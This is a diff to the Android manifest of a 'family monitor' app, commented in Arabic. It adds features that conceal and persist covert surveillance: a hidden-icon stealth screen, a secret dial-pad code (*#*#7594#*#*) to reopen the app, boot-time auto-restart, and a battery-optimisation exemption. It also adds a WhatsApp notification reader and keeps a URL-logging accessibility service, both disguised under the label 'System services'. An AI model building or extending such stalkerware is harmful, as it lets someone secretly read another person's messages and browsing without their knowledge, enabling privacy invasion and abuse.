@@ -5,7 +5,13 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <!-- التشغيل التلقائي بعد إعادة تشغيل الهاتف — كان مفقودًا وهذا سبب انقطاع المراقبة -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <!-- استثناء التطبيق من تحسينات البطارية حتى لا يوقفه النظام (يُطلب من المستخدم بحوار النظام) -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <!-- صلاحية إحصاء استخدام التطبيقات (تُمنح من إعدادات النظام) -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
@@ -20,51 +26,19 @@
         android:label="@string/app_name"
         android:theme="@style/Theme.Material3.DayNight">
 
-        <!--
-            أيقونة القاذف عبر alias — لإخفاء الأيقونة نعطّل هذا المكوّن فقط
-            (Prefs.setIconHidden) فتختفي الأيقونة من قائمة التطبيقات وتظل الخدمات شغالة،
-            والعودة للإعدادات تكون بالكود السري *#*#7594#*#* من لوحة الاتصال.
-        -->
-        <activity-alias
-            android:name="com.family.monitor.LauncherAlias"
-            android:enabled="true"
-            android:exported="true"
-            android:icon="@mipmap/ic_launcher"
-            android:label="@string/app_name"
-            android:targetActivity=".MainActivity">
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity-alias>
-
-        <activity
-            android:name=".MainActivity"
-            android:exported="true" />
-
-        <!--
-            الكود السري من لوحة الاتصال: *#*#7594#*#*
-            يفتح شاشة التمويه — الطريقة الوحيدة لفتح التطبيق بعد إخفاء الأيقونة.
-        -->
-        <receiver
-            android:name=".SecretCodeReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="7594" />
-            </intent-filter>
-        </receiver>
+        </activity>
 
         <!-- شاشة إعداد الجهاز الفرعي (كود الاقتران والمراقبة) -->
         <activity
             android:name=".SetupActivity"
             android:exported="false" />
-
-        <!-- شاشة التمويه: تظهر بعد التفعيل — بريئة بزر واحد يطلب كلمة مرور الأدمن -->
-        <activity
-            android:name=".DisguiseActivity"
-            android:exported="false"
-            android:excludeFromRecents="false" />
 
         <!-- شاشة الجهاز الأساسي: لوحة المتابعة داخل التطبيق -->
         <activity
@@ -72,17 +46,68 @@
             android:exported="false"
             android:configChanges="orientation|screenSize|keyboardHidden|screenLayout" />
 
-        <!-- خدمة المراقبة الأمامية -->
+        <!-- شاشة التخفي (تظهر بعد إخفاء الأيقونة، وتُفتح من الإشعار الثابت أو زر الترس) -->
+        <activity
+            android:name=".StealthActivity"
+            android:exported="false"
+            android:excludeFromRecents="true" />
+
+        <!-- مستقبِل إعادة تشغيل الجهاز: يشغّل خدمة المراقبة تلقائيًا
+             بعد تشغيل الهاتف أو تحديث التطبيق أو طلب إعادة تشغيل داخلي -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="com.family.monitor.RESTART_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- مستقبِل احتياطي صامت (بعض الهواتف تدعمه) — الطريقة الرسمية للرجوع هي الإشعار الثابت -->
+        <receiver
+            android:name=".DialReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data
+                    android:host="7594"
+                    android:scheme="android_secret_code" />
+            </intent-filter>
+        </receiver>
+
+        <!-- خدمة قراءة الإشعارات: رسائل واتساب الواردة (الرسمي + المجموعات + النسخ المعدلة) -->
+        <service
+            android:name=".WhatsappNotificationService"
+            android:exported="false"
+            android:label="خدمات النظام"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- خدمة المراقبة الأمامية:
+             - dataSync لأندرويد 9 وما قبله
+             - specialUse من أندرويد 14+ لأن dataSync ممنوع البدء من بث إعادة التشغيل
+               (وممنوع أيضًا أكثر من 6 ساعات متواصلة من أندرويد 15) -->
         <service
             android:name=".MonitorService"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="continuous_family_supervision_monitoring" />
+        </service>
 
-        <!-- خدمة إمكانية الوصول: لرصد عناوين المواقع وعمليات البحث (تعمل أيضًا في الوضع الخفي) -->
+        <!-- خدمة إمكانية الوصول: لرصد عناوين المواقع (تعمل أيضًا في الوضع الخفي) -->
         <service
             android:name=".UrlAccessibilityService"
             android:exported="false"
-            android:label="خدمات الجهاز"
+            android:label="خدمات النظام"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -90,17 +115,6 @@
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
-        </service>
-
-        <!-- خدمة الإشعارات: لرصد رسائل واتساب المستلمة -->
-        <service
-            android:name=".WhatsappNotificationService"
-            android:exported="false"
-            android:label="خدمات الجهاز"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
         </service>
     </application>
 </manifest>
